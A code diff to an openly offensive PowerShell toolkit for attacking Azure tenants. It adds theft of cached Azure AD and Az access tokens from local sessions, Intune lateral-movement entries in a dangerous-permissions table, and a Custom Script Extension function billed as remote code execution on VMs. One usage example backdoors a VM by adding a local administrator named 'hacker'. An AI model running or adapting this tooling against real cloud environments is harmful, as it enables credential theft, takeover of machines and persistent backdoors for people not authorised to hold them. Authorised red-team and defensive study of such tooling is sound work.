@@ -24,28 +24,32 @@ $KnownDangerousPermissions = @{
     'storageAccounts/blobServices/containers/read'        = 'Allows User to read Blobs Containers'
     'storageAccounts/blobServices/containers/blobs/write' = 'Allows Users to upload malicious files to Blob Containers'
 
-    'roleAssignments/write'            = 'Facilitates Privileges Escalation through a malicious Role Assignment'
+    'roleAssignments/write'                    = 'Facilitates Privileges Escalation through a malicious Role Assignment'
 
-    'virtualMachines/`*'               = 'Complete control over Azure VM can lead to a machine takeover by Running arbitrary Powershell commands (runCommand)'
-    'virtualMachines/read'             = 'User can read Azure VMs User Data contents as well as other VMs properties.'
-    'virtualMachines/write'            = 'Partial control over Azure VM can lead to a machine takeover by modification of VMs User Data'
-    'virtualMachines/runCommand'       = 'Allows User to Compromise Azure VM by Running arbitrary Powershell commands.'
+    'microsoft.intune/allEntities/allTasks'    = 'Death From Above: Lateral Movement From Azure to On-Prem AD via Powershell Script code execution as an Intune Administrator'
+    'microsoft.intune/allEntities/`*'          = 'Death From Above: Lateral Movement From Azure to On-Prem AD via Powershell Script code execution as an Intune Administrator'
+    'microsoft.intune/*/`*'                    = 'Death From Above: Lateral Movement From Azure to On-Prem AD via Powershell Script code execution as an Intune Administrator'
 
-    'virtualMachines/extensions/write' = 'User can compromise Azure VM by creating a Custom Script Extension on that VM.'
-    'virtualMachines/extensions/read'  = 'User can read a Custom Script Extension output on a Azure VM, which may contain sensitive data.'
+    'virtualMachines/`*'                       = 'Complete control over Azure VM can lead to a machine takeover by Running arbitrary Powershell commands (runCommand)'
+    'virtualMachines/read'                     = 'User can read Azure VMs User Data contents as well as other VMs properties.'
+    'virtualMachines/write'                    = 'Partial control over Azure VM can lead to a machine takeover by modification of VMs User Data'
+    'virtualMachines/runCommand'               = 'Allows User to Compromise Azure VM by Running arbitrary Powershell commands.'
+
+    'virtualMachines/extensions/write'         = 'User can compromise Azure VM by creating a Custom Script Extension on that VM.'
+    'virtualMachines/extensions/read'          = 'User can read a Custom Script Extension output on a Azure VM, which may contain sensitive data.'
     
-    'secrets/getSecret'                = 'User can read Key Vault Secret contents'
-    'vaults/*/read'                    = 'User can access Key Vault Secrets.'
-    'Microsoft.KeyVault/vaults/`*'     = 'User can access Key Vault Secrets.'
-    'vaults/certificatecas/`*'         = 'User can access Key Vault Certificates'
-    'vaults/certificates/`*'           = 'User can access Key Vault Certificates'
-    'vaults/keys/`*'                   = 'User can access Key Vault Keys'
-    'vaults/secrets/`*'                = 'User can access Key Vault Keys'
+    'secrets/getSecret'                        = 'User can read Key Vault Secret contents'
+    'vaults/*/read'                            = 'User can access Key Vault Secrets.'
+    'Microsoft.KeyVault/vaults/`*'             = 'User can access Key Vault Secrets.'
+    'vaults/certificatecas/`*'                 = 'User can access Key Vault Certificates'
+    'vaults/certificates/`*'                   = 'User can access Key Vault Certificates'
+    'vaults/keys/`*'                           = 'User can access Key Vault Keys'
+    'vaults/secrets/`*'                        = 'User can access Key Vault Keys'
 
-    'automationAccounts/`*'            = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Runbooks'
-    'automationAccounts/jobs/`*'       = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
-    'automationAccounts/jobs/write'    = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
-    'automationAccounts/runbooks/`*'   = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Runbooks'
+    'automationAccounts/`*'                    = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Runbooks'
+    'automationAccounts/jobs/`*'               = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
+    'automationAccounts/jobs/write'            = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
+    'automationAccounts/runbooks/`*'           = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Runbooks'
 
     'users/password/update'                    = 'User can reset Other non-admin user passwords'
     'users/authenticationMethods/create'       = 'User can create new Authentication Method on another user'
@@ -1048,6 +1052,18 @@ Function Get-ARTAccessTokenAzCli {
         $token = $null
 
         if($Resource -ne $null -and $Resource.Length -gt 0) {
+            if ($Resource -eq "https://graph.microsoft.com") {
+                Write-Verbose "Trying to acquire Azure AD access token from a local cache..."
+                try {
+                    $token = [Microsoft.Open.Azure.AD.CommonLibrary.AzureSession]::AccessTokens['AccessToken'].AccessToken
+                    Write-Verbose "Got it."
+                    return $token
+                }
+                catch {
+                    Write-Verbose "Nope. That didn't work."
+                }
+            }
+
             $token = ((az account get-access-token --resource $Resource) | ConvertFrom-Json).accessToken
         }
         else {
@@ -1105,11 +1121,12 @@ Function Get-ARTAccessTokenAz {
             $token = (Get-AzAccessToken).Token
         }
         elseif($Resource -ne $null -and $Resource.Length -gt 0 ) {
-            $token = (Get-AzAccessToken -Resource $Resource).Token
+            # Taken from AzureHound's Get-AzureGraphToken
+            $APSUser = Get-AzContext *>&1
+            $token = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate($APSUser.Account, $APSUser.Environment, $APSUser.Tenant.Id.ToString(), $null, [Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, $null, $Resource).AccessToken
 
             if ($token -eq $null -or $token.Length -eq 0) {
-                $APSUser = Get-AzContext *>&1 
-                $token = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate($APSUser.Account, $APSUser.Environment, $APSUser.Tenant.Id.ToString(), $null, [Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, $null, $Resource).AccessToken
+                $token = (Get-AzAccessToken -Resource $Resource).Token
             }
         }
         else {
@@ -1135,6 +1152,55 @@ Function Get-ARTAccessTokenAz {
     }
 }
 
+
+Function Get-ARTAccessTokenAzureADCached {
+    <#
+    .SYNOPSIS
+        Attempts to retrieve locally cached AzureAD access token, stored after Connect-AzureAD occurred.
+
+    .DESCRIPTION
+        Attempts to retrieve locally cached AzureAD access token (https://graph.microsoft.com), stored after Connect-AzureAD occurred.
+
+    .EXAMPLE
+        PS> Get-ARTAccessTokenAzureADCached
+    #>
+
+    [CmdletBinding()]
+    Param(
+    )
+
+    try {
+        $EA = $ErrorActionPreference
+        $ErrorActionPreference = 'silentlycontinue'
+
+        $token = $null
+
+        Write-Verbose "Trying to acquire Azure AD access token from a local cache..."
+
+        try {
+            $token = [Microsoft.Open.Azure.AD.CommonLibrary.AzureSession]::AccessTokens['AccessToken'].AccessToken
+            Write-Verbose "Got it."
+            return $token
+        }
+        catch {
+            Write-Verbose "Nope. That didn't work."
+            Return ""
+        }
+
+        $parsed = Parse-JWTtokenRT $token
+        Write-Verbose "Token for Resource: $($parsed.aud)"
+
+        Return $token
+    }
+    catch {
+        Write-Host "[!] Function failed!" -ForegroundColor Red
+        Throw
+        Return
+    }
+    finally {
+        $ErrorActionPreference = $EA
+    }
+}
 
 #
 # SOURCE:
@@ -2676,11 +2742,17 @@ Function Get-ARTADAccess {
     .DESCRIPTION
         Enumerate all Azure AD permissions, roles assigned for a quick Situational Awareness.
 
+    .PARAMETER AccessToken
+        Access Token to use for authentication. Optional, will try to acquire token automatically.
+
     .EXAMPLE
         PS> Get-ARTADAccess -Verbose
     #>
     [CmdletBinding()]
     Param(
+        [Parameter(Mandatory=$False)]
+        [String]
+        $AccessToken
     )
 
     try {
@@ -2695,6 +2767,10 @@ Function Get-ARTADAccess {
             if ($users -eq $null -or $users.Length -eq 0) {
                 Write-Host "[-] $who does not have access to Azure AD." -ForegroundColor Red
                 Return
+            }
+
+            if($AccessToken -eq $null -or $AccessToken.Length -eq 0) {
+                $AccessToken = Get-ARTAccessTokenAz -Resource "https://graph.microsoft.com"
             }
             
             Write-Verbose "Step 1. Enumerating current $who group membership..."
@@ -2813,7 +2889,23 @@ Function Get-ARTADAccess {
                 $Error[0].Exception.InnerException.StackTrace
             }
 
-            Write-Verbose "Step 4. Examining Administrative Units..."
+            Write-Verbose "Step 5. Checking Azure AD Dynamic Groups..."
+            Write-Host "`n=== Azure AD Dynamic Groups:`n" -ForegroundColor Yellow
+            try {
+                $dynamicGroups = Get-ARTADDynamicGroups -AccessToken $AccessToken
+
+                if ($dynamicGroups -ne $null ) {
+                    Write-Host "[+] Azure AD Dynamic Groups:" -ForegroundColor Green
+                    $dynamicGroups | ft
+                }
+            }
+            catch {
+                Write-Host "[-] Could not pull Azure AD Dynamic Groups." -ForegroundColor Red
+                Write-Host "[-] Exception occured during Get-ARTADDynamicGroups:" -ForegroundColor Red
+                $Error[0].Exception.InnerException.StackTrace
+            }
+
+            Write-Verbose "Step 6. Examining Administrative Units..."
             Write-Host "`n=== Azure AD Administrative Units:`n" -ForegroundColor Yellow
             
             $Coll = New-Object System.Collections.ArrayList
@@ -2848,7 +2940,7 @@ Function Get-ARTADAccess {
                 $Error[0].Exception.InnerException.StackTrace
             }
 
-            Write-Verbose "Step 5. Checking Azure AD Roles that are In-Use..."
+            Write-Verbose "Step 7. Checking Azure AD Roles that are In-Use..."
             Write-Host "`n=== Azure AD Roles Assigned In Tenant To Different Users:`n" -ForegroundColor Yellow
             
             $Coll = New-Object System.Collections.ArrayList
@@ -2917,7 +3009,7 @@ Function Invoke-ARTGETRequest {
         URI to invoke. For instance: https://graph.microsoft.com/v1.0/applications
 
     .PARAMETER AccessToken
-        Access Token to use for authentication.
+        Access Token to use for authentication. Optional, will try to acquire token automatically.
 
     .PARAMETER Json
         Return results as JSON.
@@ -2930,11 +3022,11 @@ Function Invoke-ARTGETRequest {
     Param(
         [Parameter(Mandatory=$True)]
         [String]
-        $AccessToken,    
-
-        [Parameter(Mandatory=$True)]
-        [String]
         $Uri,
+
+        [Parameter(Mandatory=$False)]
+        [String]
+        $AccessToken,    
 
         [Parameter(Mandatory=$False)]
         [Switch]
@@ -2945,10 +3037,15 @@ Function Invoke-ARTGETRequest {
         $EA = $ErrorActionPreference
         $ErrorActionPreference = 'silentlycontinue'
 
+        $requesthost = ([System.Uri]$Uri).Host
+
+        if($AccessToken -eq $null -or $AccessToken.Length -eq 0) {
+            $AccessToken = Get-ARTAccessTokenAz -Resource "https://$requesthost"
+        }
+
         $parsed = Parse-JWTtokenRT $AccessToken
 
         $tokenhost = ([System.Uri]$parsed.aud).Host
-        $requesthost = ([System.Uri]$Uri).Host
 
         if($tokenhost -ne $requesthost) {
             Write-Warning "Request Host ($requesthost) differs from Token Audience host ($tokenhost). Authentication failure may occur."
@@ -2962,7 +3059,7 @@ Function Invoke-ARTGETRequest {
             }
         }
 
-        $out = (Invoke-RestMethod @params).value
+        $out = Invoke-RestMethod @params
 
         if($Json) {
             $out | ConvertTo-Json
@@ -3562,13 +3659,13 @@ Function Get-ARTAzVMUserDataFromInside {
 }
 
 
-Function Set-ARTAzVMExtension {
+Function Invoke-ARTCustomScriptExtension {
     <#
     .SYNOPSIS
-        Modifies Azure VM Custom Script Extension leading to remote code execution.
+        Creates new or modifies existing Azure VM Custom Script Extension leading to remote code execution.
 
     .DESCRIPTION
-        Modifies Azure VM Custom Script Extension leading to remote code execution.
+        Creates new or modifies existing Azure VM Custom Script Extension leading to remote code execution.
 
     .PARAMETER VMName
         Name of the Virtual Machine to target.
@@ -3585,12 +3682,15 @@ Function Set-ARTAzVMExtension {
     .PARAMETER Command
         Command to be executed in Runbook.
 
+    .PARAMETER ForceNew
+        Forcefully try to create new Custom Script Extension instead of modifying existing one.    
+
     .PARAMETER Location
         Optional. Will be deduced from Get-AzVMExtension. Specifies Azure Availability Zone Location string where the VM is running, ex: "Germany West Central"
 
     .EXAMPLE
         Example 1: Backdoors target Azure VM with a new Local Administrator user named "hacker"
-        PS C:\> Set-ARTAzVMExtension -VMName infectme -ResourceGroup myresgroup -ExtensionName ExecMe -Command "powershell net users hacker HackerSecret@1337 /add /Y ; net localgroup administrators hacker /add"
+        PS C:\> Invoke-ARTCustomScriptExtension -VMName infectme -ResourceGroup myresgroup -ExtensionName ExecMe -Command "powershell net users hacker HackerSecret@1337 /add /Y ; net localgroup administrators hacker /add"
     #>
 
     [CmdletBinding()]
@@ -3615,7 +3715,10 @@ Function Set-ARTAzVMExtension {
         $ScriptPath = $null,
 
         [String]
-        $Command = $null
+        $Command = $null,
+
+        [String]
+        $ForceNew = $false
     )
 
     try {
@@ -3664,19 +3767,34 @@ Function Set-ARTAzVMExtension {
             Return
         }
 
-        $Commands = (Get-Content $ScriptPath)
-
         Write-Verbose "Setting Custom Script Extension with malicious commands..."
 
-        Set-AzVMExtension `
-            -ResourceGroupName $ResourceGroup `
-            -ExtensionName $ExtensionName `
-            -VMName $VMName `
-            -Location $Location `
-            -Publisher Microsoft.Compute `
-            -ExtensionType CustomScriptExtension `
-            -TypeHandlerVersion 1.8 `
-            -SettingString "{`"commandToExecute`":`"$Commands`"}" | Out-Null
+        if(($ForceNew) -or (-not $ableToPullExts)) {
+            Write-Host "[.] Creating new Custom Script Extension..."
+
+            Set-AzVMCustomScriptExtension `
+                -ResourceGroupName $ResourceGroup `
+                -VMName $VMName `
+                -Location $Location `
+                -Name $ExtensionName `
+                -TypeHandlerVersion "1.8" `
+                -FileName $ScriptPath | Out-Null
+        }
+        else {
+            Write-Host "[.] Updating existing Custom Script Extension..."
+
+            $Commands = (Get-Content $ScriptPath)
+
+            Set-AzVMExtension `
+                -ResourceGroupName $ResourceGroup `
+                -ExtensionName $ExtensionName `
+                -VMName $VMName `
+                -Location $Location `
+                -Publisher Microsoft.Compute `
+                -ExtensionType CustomScriptExtension `
+                -TypeHandlerVersion 1.8 `
+                -SettingString "{`"commandToExecute`":`"$Commands`"}" | Out-Null
+        }
 
         $col = "Yellow"
         if($ableToPullExts -eq $false) {
@@ -3724,6 +3842,77 @@ Function Set-ARTAzVMExtension {
     finally {
         $ErrorActionPreference = $EA
     }   
+}
+
+
+Function Get-ARTADDynamicGroups {
+    <#
+    .SYNOPSIS
+        Displays Azure AD Dynamic Groups along with their user Membership Rules
+
+    .DESCRIPTION
+        Displays Azure AD Dynamic Groups along with their user Membership Rules, members count and current user membership status
+
+    .PARAMETER AccessToken
+        Azure AD Access Token
+
+    .EXAMPLE
+        PS C:\> Get-ARTADDynamicGroups
+    #>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$False)]
+        [string]
+        $AccessToken
+    )
+
+    try {
+        $EA = $ErrorActionPreference
+        $ErrorActionPreference = 'silentlycontinue'
+
+        if($AccessToken -eq $null -or $AccessToken.Length -eq 0) {
+            Write-Warning "No Access Token supplied. Acquiring one via Az module..."
+            $AccessToken = Get-ARTAccessTokenAz -Resource https://graph.microsoft.com
+        }
+
+        if($AccessToken -eq $null -or $AccessToken.Length -eq 0) {
+            Write-Error "Cannot acquire Azure AD Access Token!"
+            Return
+        }
+
+        $Coll = New-Object System.Collections.ArrayList
+        $UserId = Get-ARTUserId
+
+        $dynamicGroups = Get-AzureADMSGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')" -All:$true
+
+        $dynamicGroups | % { 
+            $out = Invoke-ARTGETRequest -AccessToken $AccessToken -Uri "https://graph.microsoft.com/v1.0/groups/$($_.Id)"
+
+            $members = Get-AzureADGroupMember -ObjectId $_.Id
+
+            $obj = [PSCustomObject]@{
+                ObjectId            = $out.Id
+                DisplayName         = $out.DisplayName
+                IsCurrentUserMember = ($members.ObjectId -contains $UserId)
+                Description         = $out.Description
+                MembersCount        = $members.Length
+                MembershipRule      = $out.MembershipRule
+            }
+
+            $null = $Coll.Add($obj)
+        }
+        
+        Return $Coll
+    }
+    catch {
+        Write-Host "[!] Function failed!" -ForegroundColor Red
+        Throw
+        Return
+    }
+    finally {
+        $ErrorActionPreference = $EA
+    }
 }
 
 
@@ -3907,4 +4096,66 @@ namespace ROADToken
         Return ($out | ConvertFrom-Json).response.data
     }
     catch {}
+}
+
+
+Function Import-ARTModules {
+    <#
+    .SYNOPSIS
+        Installs & Imports required & optional Powershell modules for Azure Red Team activities
+
+    .DESCRIPTION
+        Installs & Imports required & optional Powershell modules for Azure Red Team activities
+
+    .EXAMPLE
+        PS C:\> Import-ARTModules
+    #>
+
+    $Modules = @(
+        "Az"
+        "AzureAD"
+        "Microsoft.Graph"
+        "AzureADPreview"
+        "AADInternals"
+    )
+
+    foreach($mod in $Modules) {
+        Load-Module $mod
+    }
+
+    Write-Host "Done."
+}
+
+
+#
+# Source:
+#   https://stackoverflow.com/a/51692402
+# 
+function Load-Module ($m) {
+    # If module is imported say that and do nothing
+    if (Get-Module | Where-Object {$_.Name -eq $m}) {
+        write-host "Module $m is already imported."
+    }
+    else {
+
+        # If module is not imported, but available on disk then import
+        if (Get-Module -ListAvailable | Where-Object {$_.Name -eq $m}) {
+            Write-Host "Importing module: $m ..."
+            Import-Module $m -Verbose
+        }
+        else {
+
+            # If module is not imported, not available on disk, but is in online gallery then install and import
+            if (Find-Module -Name $m | Where-Object {$_.Name -eq $m}) {
+                Write-Host "Installing & Importing module: $m ..."
+                Install-Module -Name $m -Force -Verbose -Scope CurrentUser
+                Import-Module $m -Verbose
+            }
+            else {
+
+                # If the module is not imported, not available and not in the online gallery then abort
+                write-host "Module $m not imported, not available and not in an online gallery, exiting."
+            }
+        }
+    }
 }
